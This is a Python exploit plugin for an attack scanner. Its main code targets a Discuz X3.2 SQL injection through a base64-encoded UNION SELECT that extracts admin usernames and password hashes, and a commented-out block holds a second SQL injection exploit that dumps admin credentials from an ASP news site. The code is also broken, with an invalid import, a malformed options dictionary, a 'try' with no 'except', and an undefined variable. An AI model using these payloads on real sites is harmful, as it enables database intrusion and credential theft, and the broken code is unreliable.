# -*- coding: cp936 -*-
'''
Demo modules for ass_hole_hunter
Reprouct from mst
'''
#from libs.functions import *
import modules.*


class hunter_exploit:
    '''discuz'''
    infos = {
        'plugin_name':'Discuz x3.2前台GET型SQL注入漏洞（绕过全局WAF）',
        'author':'demon',
        'update':'2015/06/04',
        'site':'http://www.dawner.info',
        'vuln_type':'sqlinjection',
        'vuln_source':'http://www.wooyun.org/bugs/wooyun-2014-074970'
        }
    opts  = {
        'dic','/data/tmp/url.txt or N',
        'url':'192.168.1.254 or default',
        }


    def __init__(self,url):
        self.url = url

    def exploit(self):
    '''start exploit'''
        exp_url = self.url+'forum.php?mod=attachment&findpost=ss&aid=MScgYW5kIDE9MiB1bmlvbiBhbGwgc2VsZWN0IDEsZ3JvdXBfY29uY2F0KHVzZXJuYW1lLDB4N0MzMjc0NzQ3QyxwYXNzd29yZCkgZnJvbSBwcmVfY29tbW9uX21lbWJlciB3aGVyZSAgdXNlcm5hbWUgbGlrZSAnYWRtaW58eHx5%3D'
        resp = url_get(url).read()
        try:
            if 'admin' in resp:
                match = re.search(r'admin\|2tt\|\S+',resp)
                if match:
                    print 'Discuzx2.0 Pass:'+match.group(0).split('|')[2]
                    


        


    
        
        #hunter = hunter_plugin(ip="192.168.10.103",port=23)
        #hunter.exploit()



#        if RPORT == '443':
#            url = 'https://%s%s'%(RURL,RPATH)
#        else:
#            url = 'http://%s:%s%s'%(RURL,RPORT,RPATH)
#        exp = url+"NewsType.asp?SmallClass='%20union%20select%200,username%2BCHR(124)%2Bpassword,2,3,4,5,6,7,8,9%20from%20admin%20union%20select%20*%20from%20news%20where%201=2%20and%20''='"
#        color.cprint("[*] Sending exp..",YELLOW)
#        ok  = fuck.urlget(exp)
#        if ok.getcode() == 200:
#            tmp=fuck.find('[>]+\w+[|]+\w+[<]+',ok.read())
#            if len(tmp)>0:
#                color.cprint("[*] Exploit Successful !",GREEN)
#                i=1
#                for res in tmp:
#                    res=res[1:len(res)-1]
#                    color.cprint("[%s] %s"%(i,res),GREEN)
#                    i+=1
#            else:
#                color.cprint("[!] TARGET NO VULNERABLE !",RED)
#        else:
#            color.cprint("[!] EXPLOIT FALSE ! CODE:%s"%ok.getcode(),RED)
